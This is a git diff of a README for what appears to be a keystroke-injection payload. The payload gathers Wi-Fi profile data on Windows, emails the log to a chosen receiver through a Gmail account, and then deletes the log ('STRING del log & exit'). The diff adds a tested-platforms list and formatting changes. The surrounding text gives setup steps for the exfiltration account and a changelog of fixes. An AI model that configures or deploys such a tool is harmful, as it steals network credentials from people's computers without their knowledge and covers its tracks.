@@ -1,10 +1,15 @@
-### Change the following things;
+## Change the following things;
 * **ACCOUNT**: Your **gmail account**
 * **PASSWORD**: Your **gmail password**
 * Make sure your Gmail password does not start with a capital letter, in some locales this causes the quote to be merged with the letter; 'Ä' '"A'
 * Make sure you have allowed less secure apps to login on your google account; 
 * https://support.google.com/accounts/answer/6010255
 * **RECEIVER**: The email you want to send the contents of 'log' to
+
+## Succesfully tested on:
+* Windows 10
+* Windows 8.1
+* Windows 7
 
 ## **Code**;
 ```
@@ -91,7 +96,7 @@ STRING del log & exit
 ENTER
 ```
 
-### Change log;
+## Change log;
 1. Original
 2. Bug fixes and narrowed commands
 3. Send contents of log instead the file itself
@@ -100,7 +105,7 @@ ENTER
 6. Removed .txt extensions, made variables and file names lower case, removed unnecessary text from log and added some more comments
 7. Added some spaces, quote interferance; sometimes 'Ä' instead of '"A'
 
-### Suggestions;
+## Suggestions;
 **If you have any suggestions, write them down here.**
 - DELAY 50 between powershell exit and cmd exit
 - If the SSID has a space like "TPLINK HOME" then 'a' would be set to "TPLINK"; error "Profile "TPLINK" is not found on the system" **FIXED**
